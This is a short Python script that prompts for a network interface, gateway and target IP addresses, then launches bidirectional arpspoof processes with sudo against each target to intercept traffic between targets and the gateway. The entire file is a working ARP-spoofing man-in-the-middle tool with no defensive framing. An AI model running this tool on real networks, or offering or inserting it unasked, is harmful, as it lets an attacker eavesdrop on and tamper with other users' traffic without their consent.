import subprocess

def main():
    # Prompt user for network interface
    interface = input("Enter the network interface (e.g., wlan0): ")

    # Prompt user for gateway IP
    gateway = input("Enter the gateway IP address (e.g., 192.168.0.1): ")

    # Prompt user for the number of target IPs
    num_targets = int(input("Enter the number of target IP addresses: "))

    # Initialize a list for targets
    targets = []

    # Collect target IP addresses from the user
    for i in range(1, num_targets + 1):
        target_ip = input(f"Enter target IP address #{i}: ")
        targets.append(target_ip)

    # Run arpspoof for each target
    for target in targets:
        print(f"Spoofing target {target}...")
        subprocess.Popen(["sudo", "arpspoof", "-i", interface, "-t", target, gateway])
        subprocess.Popen(["sudo", "arpspoof", "-i", interface, "-t", gateway, target])

    # Wait for user to terminate the process
    input("Press Enter to stop spoofing...")

if __name__ == "__main__":
    main()
